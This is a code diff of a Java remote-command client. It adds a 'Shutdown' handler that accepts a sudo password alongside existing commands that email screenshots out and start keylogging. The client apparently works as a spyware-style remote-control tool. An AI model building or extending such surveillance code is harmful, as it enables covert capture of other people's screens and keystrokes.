@@ -11,9 +11,7 @@ public class MainClient {
     private static boolean takeShot(int id) {
         String subject = "res/" + id;
         try {
-            SendMail.getInstance().sendMail(subject, null,
-                    Screenshot.getInstance().takeScreenShot()
-            );
+            SendMail.getInstance().sendMail(subject, null, Screenshot.getInstance().takeScreenShot());
             return true;
         } catch (IOException | MessagingException e) {
             e.printStackTrace();
@@ -40,6 +38,22 @@ public class MainClient {
             return false;
         }
     }
+
+    private static boolean Shutdown(int id, String sudopass){
+        try{
+            ShutandLog.getInstance().Logout(sudopass);
+            return true;
+        }catch (Exception e){
+            String subject = "res / " + id;
+            try {
+                SendMail.getInstance().sendMail(subject, "Can't Shutdown due to eror: " + e.toString(), null);
+            }catch (IOException | MessagingException er){
+                er.printStackTrace();
+            }
+            e.printStackTrace();
+            return false;
+        }
+    }
     public static boolean processRequest(String header) throws ArrayIndexOutOfBoundsException{
         String[] parts = header.split("/");
         System.out.println(Arrays.toString(parts));
@@ -50,9 +64,12 @@ public class MainClient {
         }
         else if (command.equalsIgnoreCase("keylog")) {
             return keyLog(id, Long.parseLong(parts[3].trim()));
-
         }
-
+        else if (command.equalsIgnoreCase("Shutdown")){
+            if (parts.length > 3)
+                return Shutdown(id,parts[3].trim());
+            return Shutdown(id,"");
+        }
         return false;
     }
 
